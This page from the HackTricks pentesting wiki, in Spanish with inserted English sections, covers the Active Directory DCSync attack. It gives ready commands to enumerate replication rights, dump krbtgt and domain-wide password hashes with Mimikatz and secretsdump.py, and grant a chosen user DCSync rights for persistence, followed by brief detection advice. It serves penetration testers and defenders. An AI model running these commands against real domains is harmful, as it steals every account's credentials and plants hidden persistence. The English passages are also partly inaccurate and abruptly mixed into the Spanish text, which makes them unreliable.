# DCSync

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilice [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y automatizar fácilmente flujos de trabajo con las herramientas comunitarias más avanzadas del mundo.\
Obtenga acceso hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## DCSync

El permiso **DCSync** implica tener estos permisos sobre el propio dominio: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** y **Replicating Directory Changes In Filtered Set**.

**Notas importantes sobre DCSync:**

* El ataque **DCSync simula el comportamiento de un Controlador de Dominio y solicita a otros Controladores de Dominio que repliquen información** utilizando el Protocolo Remoto de Replicación de Directorios (MS-DRSR). Debido a que MS-DRSR es una función válida y necesaria de Active Directory, no se puede desactivar ni deshabilitar.
* Por defecto, solo los grupos **Domain Admins, Enterprise Admins, Administrators y Domain Controllers** tienen los privilegios necesarios.
* Si alguna contraseña de cuenta se almacena con cifrado reversible, Mimikatz ofrece la opción de devolver la contraseña en texto claro.

### Enumeración

Verifique quién tiene estos permisos utilizando `powerview`:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### Explotar Localmente

Exploit Locally refers to the process of exploiting vulnerabilities or weaknesses in a system or network from within the local environment. This method allows an attacker to gain unauthorized access or control over the target system without the need for remote exploitation.

#### DCSync

DCSync is a technique used to extract password hashes from a domain controller (DC) in an Active Directory (AD) environment. It takes advantage of the replication process between domain controllers to request and retrieve password data.

##### How DCSync Works

DCSync works by impersonating a domain controller and requesting password data from another domain controller in the same AD environment. It exploits the "Directory Replication Service Remote Protocol" (MS-DRSR) to perform this operation.

To execute DCSync, an attacker needs to have administrative privileges or have compromised a user account with sufficient privileges. Once the attacker has gained access to a domain controller, they can use the "lsadump::dcsync" module in tools like Mimikatz to request and retrieve password hashes for specified user accounts.

##### Mitigating DCSync Attacks

To mitigate DCSync attacks, it is recommended to follow these best practices:

1. Implement the principle of least privilege (PoLP) to limit the privileges of user accounts and minimize the impact of compromised accounts.
2. Regularly review and update user account privileges to ensure they are appropriate and necessary.
3. Enable and enforce strong password policies, including regular password changes and complexity requirements.
4. Implement multi-factor authentication (MFA) to add an extra layer of security to user accounts.
5. Monitor and analyze event logs for any suspicious activity related to DCSync or other privilege escalation techniques.
6. Keep domain controllers and other systems up to date with the latest security patches and updates.
7. Educate users and administrators about the risks of social engineering and phishing attacks, which are often used to gain initial access to a network.

By implementing these measures, organizations can significantly reduce the risk of DCSync attacks and enhance the security of their Active Directory environment.
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Explotar de forma remota

DCSync is a technique that allows an attacker to impersonate a domain controller and request password data from the targeted domain controller. This technique takes advantage of the replication process in Active Directory to retrieve password hashes from the targeted domain controller without being detected.

To exploit this vulnerability remotely, the attacker needs to have remote access to a machine within the target network. Once inside, the attacker can use tools like Mimikatz or Impacket to execute the DCSync attack.

The DCSync attack can be executed in two ways: using the DRSUAPI method or the LDAP method. Both methods allow the attacker to retrieve password hashes from the targeted domain controller.

To execute the DCSync attack using the DRSUAPI method, the attacker needs to have administrative privileges on the target machine. The attacker can use the "lsadump::dcsync" command in Mimikatz to request password data from the domain controller.

To execute the DCSync attack using the LDAP method, the attacker needs to have a valid domain user account. The attacker can use tools like Impacket's "secretsdump.py" to retrieve password hashes from the domain controller.

It is important to note that the DCSync attack requires the attacker to have sufficient privileges and access to the target network. Additionally, this attack can be detected by monitoring tools that detect abnormal replication requests or unauthorized access attempts.

To protect against the DCSync attack, it is recommended to implement strong password policies, regularly update and patch domain controllers, and monitor network traffic for any suspicious activity.
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
`-just-dc` genera 3 archivos:

* uno con los **hashes NTLM**
* uno con las **claves Kerberos**
* uno con contraseñas en texto claro de NTDS para cualquier cuenta configurada con [**encriptación reversible**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) habilitada. Puedes obtener usuarios con encriptación reversible con el siguiente comando en PowerShell:

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistencia

Si eres un administrador de dominio, puedes otorgar estos permisos a cualquier usuario con la ayuda de `powerview`:
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Entonces, puedes **verificar si al usuario se le asignaron correctamente** los 3 privilegios buscándolos en la salida de (deberías poder ver los nombres de los privilegios dentro del campo "ObjectType"):
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Mitigación

* Evento de seguridad ID 4662 (La política de auditoría para el objeto debe estar habilitada) - Se realizó una operación en un objeto.
* Evento de seguridad ID 5136 (La política de auditoría para el objeto debe estar habilitada) - Se modificó un objeto del servicio de directorio.
* Evento de seguridad ID 4670 (La política de auditoría para el objeto debe estar habilitada) - Se cambiaron los permisos en un objeto.
* AD ACL Scanner - Crea y compara informes de ACLs. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## Referencias

* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
* [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family).
* Obtén el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com).
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y automatizar fácilmente flujos de trabajo impulsados por las herramientas comunitarias más avanzadas del mundo.\
Obtén acceso hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
